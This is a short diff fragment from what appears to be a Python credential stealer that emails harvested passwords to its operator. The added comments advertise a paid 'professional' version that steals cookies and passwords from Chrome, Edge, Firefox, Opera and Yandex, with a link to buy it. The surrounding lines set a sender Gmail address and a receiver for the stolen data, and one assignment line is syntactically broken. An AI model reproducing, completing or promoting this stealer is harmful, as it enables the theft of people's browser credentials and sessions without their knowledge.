@@ -16,6 +16,8 @@ from email import encoders
 
 
 # don't forgot to active  https://www.google.com/settings/security/lesssecureapps
+# Version Professionel : Steal cookie,password : Chrome,Microsoft Edge,Firefox,Opera,Yandex
+# Link to Download https://shoppy.gg/@hakanonymos
 
 addr_from = 'your@gmail.com' # your email to send steal_password
 addr_to   'receive email  ' # receive email
